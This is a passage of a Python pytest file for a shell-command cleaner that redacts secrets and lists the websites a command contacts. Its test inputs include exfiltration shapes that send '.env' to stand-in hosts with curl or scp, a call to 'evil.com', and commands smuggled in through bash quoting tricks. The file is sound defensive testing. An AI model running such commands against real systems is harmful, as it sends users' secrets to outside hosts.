        ("echo $$'\\' ; ssh h.com tok.abc ; echo 'x'", "echo <arg> ; ssh h.com <arg> ; echo <arg>"),
        ("echo \\'", "echo <arg>"),  # an escaped quote opens nothing
        # the split reads a closed `$'…'`, so the separator after it ends the part
        ("curl $'a' ; cat tok.abc", "curl <arg> ; cat <arg>"),
        ("wget $'a' && ls tok.abc", "wget <arg> && ls <arg>"),
        # a `$'…'` glued after text is read as one, so its `;` ends nothing
        ("echo a$'\\';curl tok.abc;'", "echo <arg>"),
        # a name with an empty label is no website
        ("curl tok..abc", "curl <arg>"),
        ("curl https://.x.com", "curl <arg>"),
        ("ssh u@.h.com", "ssh <arg>"),
        # its inside is the word, never decoded: a word holding a backslash names no website
        ("cat $'.env'", "cat .env"),
        ("curl $'https://x.com/p'", "curl x.com"),
        ("curl $'https://tok.abc\\x40x.com'", "curl <arg>"),
        ("curl $'https://x.com\\x2f@tok.abc'", "curl <arg>"),  # the escape moves the host
        ("curl $'https://a.com\\x23@b.com'", "curl <arg>"),
        # with no `$'…'` a backslash moves nothing: the host is kept as on c847ff4
        ('curl "https://x.com/p?q=\\$x"', "curl x.com"),
        ("curl 'https://x.com/a\\b'", "curl x.com"),
        # bash joins a line continuation before it reads `<(`, `>(` or `$'`
        ("curl -d <\\\n(echo a tok.abc ) x.com", "curl <unparsed>"),
        ("curl -d >\\\n(echo a tok.abc ) x.com", "curl <unparsed>"),
        ("echo $\\\n'\\' ; curl tok.abc ; '\\'", "echo <unparsed>"),
        # an assignment is read as written: a quoted `NAME=` is a program to bash
        ("$'X=1' curl tok.abc", "<arg> <arg> <arg>"),
        ("'X=1' curl tok.abc", "<arg> <arg> <arg>"),
        ("env 'A=1' curl -d tok.abc x.com", "env A=<removed> curl -d <arg> x.com"),  # env unquotes
        # a web tool's path goes before its `@`
        ("curl x.com/@tok.abc", "curl x.com"),
        ("scp f u@x.com:/a@tok.abc", "scp <arg> x.com"),
        # lenses: a query or fragment goes before `@` too; a double-quoted `${` whose `}` is past
        # its `"`, and `$[…]`, are `<unparsed>`; only bash's blanks are stripped; a web tool's
        # redirection target is a file; env and sudo get their `NAME=value` unquoted
        ("curl 'x.com?k=v@tok.abc'", "curl x.com"),
        ("curl x.com#@tok.abc", "curl x.com"),
        ('curl -d "${X:-" tok.abc "}" x.com', "curl <unparsed>"),
        ('curl -d "${HOME}/x" x.com', "curl -d <arg> x.com"),
        ("curl $[ 1 + tok.abc ]", "curl <unparsed>"),
        ("\x0b tok.abc x.com", "<arg> <arg> <arg>"),
        ("curl x.com; \u3000 sk.live.abc", "curl x.com ; <arg> <arg>"),
        ("curl x.com > tok.abc", "curl x.com <arg> <arg>"),
        ('env "X=1" curl -d tok.abc x.com', "env X=<removed> curl -d <arg> x.com"),
        # a NUL and a process substitution make the command `<unparsed>`
        ("curl -d \x00 tok.abc x.com", "curl <unparsed>"),
        ("curl \x00-d tok.abc x.com", "curl <unparsed>"),
        ("curl -d <(echo a tok.abc ) x.com", "curl <unparsed>"),
        ("curl -d >(echo a tok.abc ) x.com", "curl <unparsed>"),
        # a redirection in a wrapper's value slot leaves the rest `<arg>`
        ("sudo -u >f curl tok.abc x.com", "sudo -u <arg> <arg> <arg> <arg>"),
        # owner 2026-11-14: a command saved unread is named past plain assignments only
        ("K=$'\\' tok.abc '", "K=<removed>"),
        ("K=$'\\' tok.abc ' $(x)", "cmd <unparsed>"),
        ("K=$(echo tok.abc x)", "cmd <unparsed>"),
        ("K=\\'x' tok.abc ' $(x)", "cmd <unparsed>"),
        ("K=a\xa0tok.abc $(x)", "cmd <unparsed>"),
        ("K=a\vtok.abc $(x)", "cmd <unparsed>"),
        ("K=a\ftok.abc $(x)", "cmd <unparsed>"),
        ("K=1 curl $(x)", "curl <unparsed>"),
        ("K+=a/b:c K[0]=1\tcurl $(x)", "curl <unparsed>"),
    ],
)
def test_c2_shapes_store_this_output(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


def test_a_project_file_never_hides_a_website(project_root: Path) -> None:
    # lens: curl contacts `evil.com` whether or not the project holds a file of that name
    (project_root / "evil.com").write_text("x\n", encoding="utf-8")
    assert clean_shell("curl evil.com", project_root) == ("curl evil.com", ("evil.com",))


def test_a_dollar_pair_before_a_quote_is_no_ansi_string(project_root: Path) -> None:
    # `$$'.env'` is the process id and `.env`, never the file `$.env`
    (project_root / "$.env").write_text("x\n", encoding="utf-8")
    assert clean_command("cat $$'.env'", project_root) == "cat <arg>"
    assert clean_command("cat \\$.env", project_root) == "cat $.env"


def test_a_cleaned_command_is_never_split_as_shlex_splits_an_ansi_string() -> None:
    # bash leaves the last `'` open, so the words are the plain split, as for any open quote
    assert cleaned_words("cat $'\\'x'y'") == ["cat", "$'\\'x'y'"]


@pytest.mark.parametrize(
    ("raw", "sites"),
    [
        ("cat .env", ()),
        ("find . -name x", ()),
        ("python3.12 -V", ()),
        ("true; tok.abc", ()),
        ("curl -T .env x.com", ("x.com",)),
        ("cat .env | curl -d @- x.com", ("x.com",)),
        ("curl x.com; wget -q y.org x.com; ssh h.com tok.abc", ("x.com", "y.org", "h.com")),
        ("echo https://a.example/p x.com", ("a.example",)),
        ("echo " + "a " * 1_200 + "https://late.example/x", ("late.example",)),
        ("curl $(x) x.com", ()),
        ("echo $'a' ; curl x.com", ("x.com",)),
        ("K=a\xa0b curl x.com", ("x.com",)),  # parsed: the NBSP is in the value
        # a project file, `.` or a name with an empty label is never a website
        ("scp .env user@x.com:", ("x.com",)),
        ("scp ./README.md user@x.com:", ("x.com",)),
        ("rsync -av ./dist/ user@x.com:/var/www", ("x.com",)),
        ("curl x.com > README.md", ("x.com",)),
        ("curl https://x.com > out.json", ("x.com",)),
        ("scp notes.txt me@h.com:/p", ("h.com",)),
        # C2-fix2: distinct ignoring case, the first spelling kept
        ("curl x.com X.com", ("x.com",)),
        ("curl https://x.com X.COM", ("x.com",)),
        ("curl X.com x.com y.org", ("X.com", "y.org")),
        # only ASCII case: names that differ in more than case stay two
        ("curl https://straße.com https://strasse.com", ("straße.com", "strasse.com")),
        ("curl https://ς.com https://σ.com", ("ς.com", "σ.com")),
    ],
)
def test_the_sites_are_the_websites_the_cleaner_kept(
    project_root: Path, raw: str, sites: tuple[str, ...]
) -> None:
    command, found = clean_shell(raw, project_root)
    assert found == sites
    assert all(type(site) is str for site in found)
